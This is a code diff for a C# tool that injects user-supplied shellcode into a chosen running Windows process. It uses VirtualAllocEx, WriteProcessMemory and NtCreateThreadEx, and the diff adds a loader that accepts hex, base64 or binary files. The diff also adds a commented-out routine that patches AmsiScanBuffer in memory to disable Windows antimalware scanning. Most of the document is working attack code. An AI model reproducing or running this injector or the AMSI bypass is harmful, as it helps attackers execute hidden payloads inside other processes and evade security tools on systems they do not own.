@@ -41,6 +41,15 @@ class Program
         IntPtr AttributeList);
 
     [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr hObject);
 
     const uint PROCESS_VM_WRITE = 0x0020;
@@ -54,28 +63,51 @@ class Program
     const uint MEM_RESERVE = 0x00002000;
 
     const uint PAGE_EXECUTE_READWRITE = 0x40;
+    const uint PAGE_EXECUTE_READ = 0x20;
+
+    //static void patchAmsi()
+    //{
+    //    IntPtr amsi = LoadLibrary("amsi.dll");
+    //    IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
+
+    //    uint old;
+    //    VirtualProtect(amsiScanBuffer, 6, 0x40, out old);
+
+    //    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    //    Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
+
+    //    VirtualProtect(amsiScanBuffer, 6, old, out old);
+    //}
+
+    static byte[] LoadShellcode(string input)
+    {
+        input = input.Trim();
+
+        if (input.StartsWith("0x"))
+            return Convert.FromHexString(input.Substring(2));
+
+        if (input.Contains('+') || input.Contains('/'))
+            return Convert.FromBase64String(input);
+
+        if (File.Exists(input))
+            return File.ReadAllBytes(input);
+
+        return Convert.FromHexString(input);
+    }
 
     static void Main ()
     {
         try
         {
+            // patchAmsi();
+
             Console.Write("Enter the process name (Write without the .exe extension): ");
             string processname = Console.ReadLine();
 
-            Console.Write("Enter your shell code (check README.md): ");
+            Console.Write("Enter your hex/base64/path to bin file/ (check README.md): ");
 
             string input = Console.ReadLine().Replace(" ", "").Replace("\n", "").Replace("\r", "");
-            byte[] shellcode;
-
-            try
-            {
-                shellcode = Convert.FromHexString(input);
-            }
-            catch
-            {
-                Console.WriteLine("[!] Invalid HEX. Exiting....");
-                return;
-            }
+            byte[] code = LoadShellcode(input);
 
             Process[] procs = Process.GetProcessesByName(processname);
             if (procs.Length == 0)
@@ -96,14 +128,16 @@ class Program
                 return;
             }
 
-            IntPtr AllocatedEx = VirtualAllocEx(hProcess, 0, shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            IntPtr AllocatedEx = VirtualAllocEx(hProcess, 0, code.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             if (AllocatedEx == IntPtr.Zero)
             {
                 Console.WriteLine("[!] VirtualAllocEx Failed");
                 CloseHandle(hProcess);
                 return;
             }
-            bool success = WriteProcessMemory(hProcess, AllocatedEx, shellcode, shellcode.Length, out bytesWritten);
+            bool success = WriteProcessMemory(hProcess, AllocatedEx, code, code.Length, out bytesWritten);
+
+            VirtualProtect(AllocatedEx, (uint)code.Length, PAGE_EXECUTE_READ, out uint oldProtect);
 
             IntPtr hThread;
             int status = NtCreateThreadEx(
